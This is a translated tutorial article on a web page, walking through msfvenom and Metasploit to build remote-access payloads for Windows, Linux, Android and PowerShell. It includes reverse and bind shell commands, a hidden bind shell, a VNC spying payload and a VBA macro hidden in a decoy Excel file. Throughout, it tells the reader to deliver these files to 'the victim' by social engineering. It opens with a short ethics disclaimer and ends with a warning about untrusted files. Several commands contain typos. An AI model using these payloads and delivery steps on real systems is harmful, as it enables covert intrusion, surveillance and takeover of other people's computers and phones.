<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>About creating payloads for different platforms using msfvenom</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="‚ÄúThe head is the best antivirus‚Äù - this idea will never lose its relevance. In order to effectively deal with computer threats, you need to know your ...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>About creating payloads for different platforms using msfvenom</h1><div class="post__text post__text-html js-mediator-article">  ‚ÄúThe head is the best antivirus‚Äù - this idea will never lose its relevance.  In order to effectively deal with computer threats, you need to know your enemies.  Among such enemies are programs that allow you to seamlessly connect to a computer and perform certain actions with it, in other words, software for hacking systems.  We believe that knowing how to create such software, at least at a basic level, understanding how it works, is useful to anyone who is concerned with computer security issues.  In addition, such software can be used to check the security of your own systems. <br><br><div style="text-align:center;"><img src="https://habrastorage.org/getpro/habr/post_images/430/af0/0b0/430af00b0d9216e5d3dec89d93a2bbde.jpg" alt="image"></div><br>  Therefore, today we decided to share with you the translation of the material, the author of which talks about how to create and use payloads, or payloads, intended for remote control of various systems, in particular - Windows, Linux and Android, using msfvenom - a command line tool from Metasploit package.  Just want to note that what you will learn below should be treated with caution, remembering that unauthorized entry into other people's systems is unethical and illegal. <br><a name="habracut"></a><br><h2>  <font color="#3AC1EF">Prerequisites</font> </h2><br>  In order to try what is being discussed, in practice, you will need a computer with Kali Linux installed on it, computers running Windows and Linux, and an Android smartphone.  In the process of work, when drawing up teams, we will use the following keys: <br><br><ul><li>  Lhost - the IP address of the computer on which Kali is installed, that is, our working machine. <br></li><li>  Lport is a port that is assigned to a server ‚Äî a program that ‚Äúlistens‚Äù to a network and waits for a connection from a client. <br></li><li>  P - short for payload, payload for the selected platform <br></li><li>  F is the key that specifies the file type, for example, exe for Windows, apk for Android, and so on. <br></li></ul><br>  In the Kali terminal, enter the <code>msfvenom</code> command.  The results of her work are shown below.  Namely, a list of all available options for creating payloads will be displayed.  Here we consider only some of them. 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
    <div style="text-align:center;"><img src="https://habrastorage.org/getpro/habr/post_images/279/77f/eb9/27977feb9aa95751ec49e1a34a5d0742.png"></div><br><h2>  <font color="#3AC1EF">Bind Shell Connections</font> </h2><br>  Bind shell is a scheme of interaction with a remote console in which a service is launched on the target computer to which an attacker can connect.  In fact, we are talking about a direct connection to the attacked computer.  In order to create the corresponding payload for Windows, you need to run the following command in the terminal: <br><br><pre> <code class="hljs nginx"><span class="hljs-attribute"><span class="hljs-attribute">msfvenom</span></span> -p windows/meterpreter/bind_tcp -f exe &gt; /root/Desktop/bind.exe</code> </pre> <br>  As a result, an exe file will be created, which will be saved to the address specified when the command is executed, namely, this is <code>/root/Desktop/bind.exe</code> .  The resulting file must somehow be delivered to the victim's computer and execute it.  For example - use the methods of social engineering or put it on the file sharing service. <br><br><div style="text-align:center;"><img src="https://habrastorage.org/getpro/habr/post_images/178/41f/28f/17841f28fb9b9eb305e9380abd9e024c.png"></div><br>  Now run <code>msfconsole</code> and enter the commands below to open the session: <br><br><pre> <code class="hljs pgsql">msf &gt; use exploit/multi/<span class="hljs-keyword"><span class="hljs-keyword">handler</span></span> msf exploit(<span class="hljs-keyword"><span class="hljs-keyword">handler</span></span>) &gt; <span class="hljs-keyword"><span class="hljs-keyword">set</span></span> payload windows/meterpreter/bind_tcp msf exploit(<span class="hljs-keyword"><span class="hljs-keyword">handler</span></span>) &gt; <span class="hljs-keyword"><span class="hljs-keyword">set</span></span> rhost IP <span class="hljs-number"><span class="hljs-number">192.168</span></span><span class="hljs-number"><span class="hljs-number">.0</span></span><span class="hljs-number"><span class="hljs-number">.100</span></span> msf exploit(<span class="hljs-keyword"><span class="hljs-keyword">handler</span></span>) &gt; <span class="hljs-keyword"><span class="hljs-keyword">set</span></span> lport <span class="hljs-number"><span class="hljs-number">4444</span></span> msf exploit(<span class="hljs-keyword"><span class="hljs-keyword">handler</span></span>) &gt; exploit</code> </pre> <br>  After the file is executed, we will have meterpreter-connection to the target computer: <br><br><div style="text-align:center;"><img src="https://habrastorage.org/getpro/habr/post_images/8fe/562/869/8fe562869e224ca1416588a48ae3bb12.png"></div><br>  The <code>bind_tcp</code> option used here is useful when we disconnect from the victim‚Äôs computer, but it still works.  We can execute the same command and connect again, without the need for the exploit to be launched on the remote computer again. <br><br><h2>  <font color="#3AC1EF">Reverse Shell Connections</font> </h2><br>  Reverse Shell (or Reverse TCP, or connect-back, or reverse connection) is a scheme of interaction with a remote computer, the reverse of the above.  When using it, the attacker first needs to start the server on his machine, while the target machine will play the role of a client that connects to this server, after which the attacker gets access to the shell of the target computer. <br><br>  In order to create an appropriate payload, enter the following command in the Kali terminal: <br><br><pre> <code class="hljs nginx"><span class="hljs-attribute"><span class="hljs-attribute">msfvenom</span></span> -p windows/meterpreter/reverse_tcp lhost=<span class="hljs-number"><span class="hljs-number">192.168.0.107</span></span> lport=<span class="hljs-number"><span class="hljs-number">5555</span></span> -f exe &gt; / root/Desktop/reverse_tcp.exe.</code> </pre> <br><div style="text-align:center;"><img src="https://habrastorage.org/getpro/habr/post_images/0ff/a9c/b43/0ffa9cb43d8beb1bc9e15f4e01a0f51e.png"></div><br>  In this case, we include in the command some new parameters, such as <code>lhost</code> (local host), <code>lport</code> (local port) in order to accept a reverse connection from the victim's computer. <br><br>  After the payload is created, sent to the attacked computer and executed there, we proceed to the second step of the attack.  Run <code>msfconsole</code> and enter the following commands in order to connect the remote computer to our machine. <br><br><pre> <code class="hljs pgsql">msf &gt; use exploit/multi/<span class="hljs-keyword"><span class="hljs-keyword">handler</span></span> msf exploit(<span class="hljs-keyword"><span class="hljs-keyword">handler</span></span>) &gt; <span class="hljs-keyword"><span class="hljs-keyword">set</span></span> payload windows/meterpreter/reverse_tcp msf exploit(<span class="hljs-keyword"><span class="hljs-keyword">handler</span></span>) &gt; <span class="hljs-keyword"><span class="hljs-keyword">set</span></span> lhost IP <span class="hljs-number"><span class="hljs-number">192.168</span></span><span class="hljs-number"><span class="hljs-number">.0</span></span><span class="hljs-number"><span class="hljs-number">.107</span></span> msf exploit(<span class="hljs-keyword"><span class="hljs-keyword">handler</span></span>) &gt; <span class="hljs-keyword"><span class="hljs-keyword">set</span></span> lport <span class="hljs-number"><span class="hljs-number">5555</span></span> msf exploit(<span class="hljs-keyword"><span class="hljs-keyword">handler</span></span>) &gt; exploit</code> </pre> <br>  The figure below shows that after the victim launches the payload, the connection to our computer is reversed and we have a <code>meterpreter</code> session. <br><br><div style="text-align:center;"><img src="https://habrastorage.org/getpro/habr/post_images/00c/748/b6d/00c748b6d1739830e5a23aa84f4f0f01.png"></div><br><h2>  <font color="#3AC1EF">Reverse HTTPS Connectivity</font> </h2><br>  Please note that both of the above attacks are feasible if the victim‚Äôs machine has suitable working ports.  Now we will try to find a way out of the situation when the ports on the computer of interest to us are blocked.  In such a case, you can navigate the situation and create a payload, for example, using port 443 for HTTPS.  To do this, enter the following command in the Kali terminal: <br><br><pre> <code class="hljs nginx"><span class="hljs-attribute"><span class="hljs-attribute">msfvenom</span></span> -p windows/meterpreter/reverse_https lhost=<span class="hljs-number"><span class="hljs-number">192.168.0.107</span></span> lport=<span class="hljs-number"><span class="hljs-number">443</span></span> -f exe &gt; /root/Desktop/<span class="hljs-number"><span class="hljs-number">443</span></span>.exe</code> </pre> <br><div style="text-align:center;"><img src="https://habrastorage.org/getpro/habr/post_images/21a/4b5/b6f/21a4b5b6f66a4b2d0f49e41742766034.png"></div><br>  After creating the payload and sending it to the victim, who is expected to launch the corresponding file sooner or later, we proceed to the next step.  Run <code>msfconsole</code> and enter the following commands to organize the connection: <br><br><pre> <code class="hljs pgsql">msf &gt; use exploit/multi/<span class="hljs-keyword"><span class="hljs-keyword">handler</span></span> msf exploit(<span class="hljs-keyword"><span class="hljs-keyword">handler</span></span>) &gt; <span class="hljs-keyword"><span class="hljs-keyword">set</span></span> payload windows/meterpreter/reverse_https msf exploit(<span class="hljs-keyword"><span class="hljs-keyword">handler</span></span>) &gt; <span class="hljs-keyword"><span class="hljs-keyword">set</span></span> lhost IP <span class="hljs-number"><span class="hljs-number">192.168</span></span><span class="hljs-number"><span class="hljs-number">.0</span></span><span class="hljs-number"><span class="hljs-number">.107</span></span> msf exploit(<span class="hljs-keyword"><span class="hljs-keyword">handler</span></span>) &gt; <span class="hljs-keyword"><span class="hljs-keyword">set</span></span> lport <span class="hljs-number"><span class="hljs-number">443</span></span> msf exploit(<span class="hljs-keyword"><span class="hljs-keyword">handler</span></span>) &gt; exploit</code> </pre> <br>  As can be seen in the following figure, after the payload has been launched on the target computer, the connection to our computer is reversed and we can use the meterpreter session capabilities. <br><br><div style="text-align:center;"><img src="https://habrastorage.org/getpro/habr/post_images/ee6/f20/bbe/ee6f20bbeca6c30b8d9eaca1faf0845a.png"></div><br><h2>  <font color="#3AC1EF">Hidden Bind Shell Connection</font> </h2><br>  Investigate another possibility msfvenom and try to gain control over a remote computer with it.  This time we want to get access to the command shell, not to the meterpreter session. <br><br>  The payload we create by the command below, after execution, is hidden in the system, it cannot be detected by the port scanner. <br><br><pre> <code class="hljs nginx"><span class="hljs-attribute"><span class="hljs-attribute">msfvenom</span></span> -p windows/shell_hidden_bind_tcp ahost=<span class="hljs-number"><span class="hljs-number">192.168.0.107</span></span> lport=<span class="hljs-number"><span class="hljs-number">1010</span></span> -f exe &gt; /root/Desktop/hidden.exe</code> </pre> <br><div style="text-align:center;"><img src="https://habrastorage.org/getpro/habr/post_images/2f6/8ec/ac5/2f68ecac5228595c4b0ccee81bcb9f16.png"></div><br>  After the file is ready and sent to the victim, we can proceed to the next step.  Namely, we will use Netcat by entering the following command in the Kali terminal: <br><br><pre> <code class="hljs css"><span class="hljs-selector-tag"><span class="hljs-selector-tag">nc</span></span> 192<span class="hljs-selector-class"><span class="hljs-selector-class">.168</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.0</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.100</span></span> 1010</code> </pre> <br><div style="text-align:center;"><img src="https://habrastorage.org/getpro/habr/post_images/67f/a7f/7ae/67fa7f7aead5edaf4dd4301d09f8a87b.png"></div><br><h2>  <font color="#3AC1EF">Reverse Shell Connection Using Netcat</font> </h2><br>  Now let's look at another approach to using shell_reverse_tcp <code>shell_reverse_tcp</code> , which allow you to access the command line shell of the attacked computer.  Enter the following command in the Kali terminal: <br><br><pre> <code class="hljs nginx"><span class="hljs-attribute"><span class="hljs-attribute">msfvenom</span></span> -p windows/shell_reverse_tcp ahost=<span class="hljs-number"><span class="hljs-number">192.168.0.107</span></span> lport=<span class="hljs-number"><span class="hljs-number">1111</span></span>-f exe &gt; /root/Desktop/ncshell.exe</code> </pre> <br><div style="text-align:center;"><img src="https://habrastorage.org/getpro/habr/post_images/4f9/32e/140/4f932e140fcea645f2ea740cae6fc6e8.png"></div><br>  After creating the file and sending it to the attacked computer, create a port listener using <code>netcat</code> : <br><br><pre> <code class="hljs nginx"><span class="hljs-attribute"><span class="hljs-attribute">nc</span></span> -lvp <span class="hljs-number"><span class="hljs-number">1111</span></span></code> </pre> <br>  Provided that our payload was successfully executed on a remote computer, the following shows what the connection to it looks like. <br><br><div style="text-align:center;"><img src="https://habrastorage.org/getpro/habr/post_images/d3f/cec/45d/d3fcec45d562f77e4fba6c8c0421685f.png"></div><br><h2>  <font color="#3AC1EF">Payload Macros on VBA</font> </h2><br>  Create a payload in the form of a VBA script, which we will use as a MS Excel macro to attack the target machine.  In order to do this, run the following command in the Kali terminal: <br><br><pre> <code class="hljs nginx"><span class="hljs-attribute"><span class="hljs-attribute">msfvenom</span></span> -p windows/meterpreter/reverse_tcp lhost=<span class="hljs-number"><span class="hljs-number">192.168.0.107</span></span> lport=<span class="hljs-number"><span class="hljs-number">7777</span></span> -f vba</code> </pre> <br><div style="text-align:center;"><img src="https://habrastorage.org/getpro/habr/post_images/a2a/91b/c98/a2a91bc9893207f6d583edec99ff7792.png"></div><br>  After executing the command, you need to copy what is highlighted in the figure above, from <code>#if vba 7</code> to <code>End if</code> .  Next, open the MS Excel file, press <code>Alt+F11</code> to open the macro control window. <br><br><div style="text-align:center;"><img src="https://habrastorage.org/getpro/habr/post_images/15f/d4a/27d/15fd4a27d4964fb3331eec037d30832d.png"></div><br>  Here we enter the name of the macro and click on the <code>Create</code> button.  We want to save the macro in the open book, so choose <code>This Workbook</code> from the corresponding drop-down list. <br><br><div style="text-align:center;"><img src="https://habrastorage.org/getpro/habr/post_images/590/243/b2f/590243b2f7087c9810f5f1d24c31b8e6.png"></div><br>  After that, insert the previously copied payload code in the VBA editor, close the editor and enable macros. <br><br><div style="text-align:center;"><img src="https://habrastorage.org/getpro/habr/post_images/1fa/02a/272/1fa02a272bd46f250b1dc789fbcb0c59.png"></div><br>  Now you can fill the Excel file with some plausible-looking data, in our case it is just the word <code>Test</code> , save and send to the victim.  To connect to a remote computer, open the Kali terminal, execute the <code>msfconsole</code> command, and then enter the following commands: <br><br><pre> <code class="hljs pgsql">msf &gt; use exploit/multi/<span class="hljs-keyword"><span class="hljs-keyword">handler</span></span> msf exploit(<span class="hljs-keyword"><span class="hljs-keyword">handler</span></span>) &gt; <span class="hljs-keyword"><span class="hljs-keyword">set</span></span> paylaod windows/meterpreter/reverse_tcp msf exploit(<span class="hljs-keyword"><span class="hljs-keyword">handler</span></span>) &gt; <span class="hljs-keyword"><span class="hljs-keyword">set</span></span> lhost=<span class="hljs-number"><span class="hljs-number">192.168</span></span><span class="hljs-number"><span class="hljs-number">.0</span></span><span class="hljs-number"><span class="hljs-number">.107</span></span> msf exploit(<span class="hljs-keyword"><span class="hljs-keyword">handler</span></span>) &gt; <span class="hljs-keyword"><span class="hljs-keyword">set</span></span> lport= <span class="hljs-number"><span class="hljs-number">7777</span></span> msf exploit(<span class="hljs-keyword"><span class="hljs-keyword">handler</span></span>) &gt; exploit</code> </pre> <br>  When the Excel file is opened on the computer of interest to us, the victim will be prompted to enable macros.  After they are turned on, a VBA script will be executed, which will create a reverse connection to the remote computer.  It will look like the one below. <br><br><div style="text-align:center;"><img src="https://habrastorage.org/getpro/habr/post_images/54d/555/c7b/54d555c7b8831be716c831614c4171aa.png"></div><br><h2>  <font color="#3AC1EF">VNC payload</font> </h2><br>  Although it is indecent, without the knowledge of the person, to observe what he is doing at the computer, the payload we will create now is doing just that.  Open the Kali terminal and enter the following command: <br><br><pre> <code class="hljs nginx"><span class="hljs-attribute"><span class="hljs-attribute">msfvenom</span></span> -p windows/vncinject/reverse_tcp lhost=<span class="hljs-number"><span class="hljs-number">192.168.0.107</span></span> lport=<span class="hljs-number"><span class="hljs-number">5900</span></span> -f exe &gt; /root/Desktop/vnc.exe</code> </pre> <br><div style="text-align:center;"><img src="https://habrastorage.org/getpro/habr/post_images/c00/a4d/672/c00a4d672d91b11ed13c768cb632e89d.png"></div><br>  After creating the payload, we, as usual, send it to the victim, and then begin to prepare for the connection.  To do this, we call the <code>msfconsole</code> command in the terminal and do the following: <br><br><pre> <code class="hljs sql">msf exploit(<span class="hljs-keyword"><span class="hljs-keyword">handler</span></span>) &gt; <span class="hljs-keyword"><span class="hljs-keyword">use</span></span> exploit/multi/<span class="hljs-keyword"><span class="hljs-keyword">handler</span></span> msf exploit(<span class="hljs-keyword"><span class="hljs-keyword">handler</span></span>) &gt; <span class="hljs-keyword"><span class="hljs-keyword">set</span></span> paylaod windows/vncinject/reverse_tcp msf exploit(<span class="hljs-keyword"><span class="hljs-keyword">handler</span></span>) &gt; <span class="hljs-keyword"><span class="hljs-keyword">set</span></span> lhost <span class="hljs-number"><span class="hljs-number">192.168</span></span><span class="hljs-number"><span class="hljs-number">.0</span></span><span class="hljs-number"><span class="hljs-number">.107</span></span> msf exploit(<span class="hljs-keyword"><span class="hljs-keyword">handler</span></span>) &gt; <span class="hljs-keyword"><span class="hljs-keyword">set</span></span> lport= <span class="hljs-number"><span class="hljs-number">5900</span></span> msf exploit(<span class="hljs-keyword"><span class="hljs-keyword">handler</span></span>) &gt; exploit</code> </pre> <br><div style="text-align:center;"><img src="https://habrastorage.org/getpro/habr/post_images/8c6/797/35f/8c679735f2a0db93797fea57112a7b8c.png"></div><br>  Here you can see that the VNC injection is done, that the remote connection has been established.  Also on the computer running Kali, the Remote Desktop window will open. <br><br><div style="text-align:center;"><img src="https://habrastorage.org/getpro/habr/post_images/754/f00/d6d/754f00d6dc550fc720d38e5ea850c638.png"></div><br><h2>  <font color="#3AC1EF">Payload for Android</font> </h2><br>  Hacking mobile devices has always attracted considerable attention, so consider the method of creating payloads for the Android platform.  Open the Kali terminal and enter the following command: <br><br><pre> <code class="hljs nginx"><span class="hljs-attribute"><span class="hljs-attribute">msfvenom</span></span> -p andriod/meterpreter/reverse_tcp lhost=<span class="hljs-number"><span class="hljs-number">192.168.0.107</span></span> lport=<span class="hljs-number"><span class="hljs-number">8888</span></span> &gt; /root/Desktop/file.apk</code> </pre> <br><div style="text-align:center;"><img src="https://habrastorage.org/getpro/habr/post_images/54a/13b/8b8/54a13b8b8da4a01f47fc5ee4bee75b05.png"></div><br>  After preparing the apk-file, you need to transfer it to the mobile device you are interested in.  Then you need to prepare for connecting to Kali: <br><br><pre> <code class="hljs pgsql">msf &gt; use exploit/multi/<span class="hljs-keyword"><span class="hljs-keyword">handler</span></span> msf exploit(<span class="hljs-keyword"><span class="hljs-keyword">handler</span></span>) &gt; <span class="hljs-keyword"><span class="hljs-keyword">set</span></span> payload android/meterpreter/reverse_tcp msf exploit(<span class="hljs-keyword"><span class="hljs-keyword">handler</span></span>) &gt; <span class="hljs-keyword"><span class="hljs-keyword">set</span></span> lhost <span class="hljs-number"><span class="hljs-number">192.168</span></span><span class="hljs-number"><span class="hljs-number">.0</span></span><span class="hljs-number"><span class="hljs-number">.107</span></span> msf exploit(<span class="hljs-keyword"><span class="hljs-keyword">handler</span></span>) &gt; <span class="hljs-keyword"><span class="hljs-keyword">set</span></span> lport <span class="hljs-number"><span class="hljs-number">8888</span></span> msf exploit(<span class="hljs-keyword"><span class="hljs-keyword">handler</span></span>) &gt; exploit</code> </pre> <br>  After the payload is launched, we will have a meterpreter session at our disposal and we will be able to interact with the hacked phone. <br><br><div style="text-align:center;"><img src="https://habrastorage.org/getpro/habr/post_images/afc/562/067/afc562067e0cd08291b3557e92b6bd47.png"></div><br><h2>  <font color="#3AC1EF">Linux payload</font> </h2><br>  Open the Kali terminal and enter the following command: <br><br><pre> <code class="hljs nginx"><span class="hljs-attribute"><span class="hljs-attribute">msfvenom</span></span> -p linux/x86/meterpreter/reverse_tcp lhost=<span class="hljs-number"><span class="hljs-number">192.168.0.107</span></span> lport=<span class="hljs-number"><span class="hljs-number">4444</span></span> -f elf &gt; /root/Desktop/shell</code> </pre> <br><div style="text-align:center;"><img src="https://habrastorage.org/getpro/habr/post_images/18c/a84/f63/18ca84f6337bdfe6dd4756138dc021db.png"></div><br>  After creating the file, you need to send it to the victim's computer and prepare for the connection: <br><br><pre> <code class="hljs pgsql">msf &gt; use exploit/multi/<span class="hljs-keyword"><span class="hljs-keyword">handler</span></span> msf exploit(<span class="hljs-keyword"><span class="hljs-keyword">handler</span></span>) &gt; <span class="hljs-keyword"><span class="hljs-keyword">set</span></span> payload linux/x86/meterpreter/reverse_tcp msf exploit(<span class="hljs-keyword"><span class="hljs-keyword">handler</span></span>) &gt; <span class="hljs-keyword"><span class="hljs-keyword">set</span></span> lhost <span class="hljs-number"><span class="hljs-number">192.168</span></span><span class="hljs-number"><span class="hljs-number">.0</span></span><span class="hljs-number"><span class="hljs-number">.107</span></span> msf exploit(<span class="hljs-keyword"><span class="hljs-keyword">handler</span></span>) &gt; <span class="hljs-keyword"><span class="hljs-keyword">set</span></span> lhost <span class="hljs-number"><span class="hljs-number">4444</span></span> msf exploit(<span class="hljs-keyword"><span class="hljs-keyword">handler</span></span>) &gt; run</code> </pre> <br>  After the execution of the payload, a reverse TCP connection will be created to our computer, which will provide us with the meterpreter session. <br><br><div style="text-align:center;"><img src="https://habrastorage.org/getpro/habr/post_images/50e/e2f/7e4/50ee2f7e4f1fa765dd1d25ee2107094d.png"></div><br><h2>  <font color="#3AC1EF">PowerShell Payload</font> </h2><br>  In order to create a payload for PowerShell, open the Kali terminal and enter the following command: <br><br><pre> <code class="hljs nginx"><span class="hljs-attribute"><span class="hljs-attribute">msfvenom</span></span> -p cmd/windows/reverse_powershell lhost=<span class="hljs-number"><span class="hljs-number">192.168.0.107</span></span> lport=<span class="hljs-number"><span class="hljs-number">4444</span></span> &gt; /root/Desktop/shell.bat</code> </pre> <br><div style="text-align:center;"><img src="https://habrastorage.org/getpro/habr/post_images/042/b1f/bc8/042b1fbc8c5fe90ecc4c65b8566faa29.png"></div><br>  Now, as usual, after creating the payload, we will transfer it to the computer we are interested in and prepare to accept the connection: <br><br><pre> <code class="hljs pgsql">msf &gt; use multi/<span class="hljs-keyword"><span class="hljs-keyword">handler</span></span> msf exploit(<span class="hljs-keyword"><span class="hljs-keyword">handler</span></span>) &gt; <span class="hljs-keyword"><span class="hljs-keyword">set</span></span> payload cmd/windows/reverse_powershell msf exploit(<span class="hljs-keyword"><span class="hljs-keyword">handler</span></span>) &gt; <span class="hljs-keyword"><span class="hljs-keyword">set</span></span> lhost <span class="hljs-number"><span class="hljs-number">192.168</span></span><span class="hljs-number"><span class="hljs-number">.0</span></span><span class="hljs-number"><span class="hljs-number">.107</span></span> msf exploit(<span class="hljs-keyword"><span class="hljs-keyword">handler</span></span>) &gt; <span class="hljs-keyword"><span class="hljs-keyword">set</span></span> lport <span class="hljs-number"><span class="hljs-number">4444</span></span> msf exploit(<span class="hljs-keyword"><span class="hljs-keyword">handler</span></span>) &gt; run</code> </pre> <br>  After launch, the payload will create a reverse connection to the shell.  It looks like the one below. <br><br><div style="text-align:center;"><img src="https://habrastorage.org/getpro/habr/post_images/c59/8ea/dbb/c598eadbb49a3f4e6938636a33a05a20.png"></div><br><h2>  <font color="#3AC1EF">Results</font> </h2><br>  As you can see, using msfvenom is very easy to create programs designed to remotely connect to a variety of systems.  The fact that it is available even to users with minimal training makes the rule that everyone knows, but not everyone observes, a special urgency: ‚ÄúDo not open files whose origin is in doubt.‚Äù <br><br>  Dear readers!  Do you know cases of hacking systems using peyload similar to those we talked about today? </div><p>Source: <a href="https://habr.com/ru/post/343612/">https://habr.com/ru/post/343612/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../343596/index.html">Multi-channel attribution through Calltouch</a></li>
<li><a href="../343598/index.html">Why did I buy a Mac Mini (Late 2012) on the eve of 2018?</a></li>
<li><a href="../343600/index.html">Who and how much to keep pace with progress?</a></li>
<li><a href="../343604/index.html">We teach the machine to understand the human genes</a></li>
<li><a href="../343610/index.html">PHP 7.2.0 released</a></li>
<li><a href="../343614/index.html">Learn CSS Grid in 5 minutes</a></li>
<li><a href="../343616/index.html">Another Telegram-bot for video surveillance</a></li>
<li><a href="../343622/index.html">Eight C ++ 17 features that every developer should use</a></li>
<li><a href="../343624/index.html">Lambda the ripper</a></li>
<li><a href="../343628/index.html">DevDay about microservices. Record the best reports</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>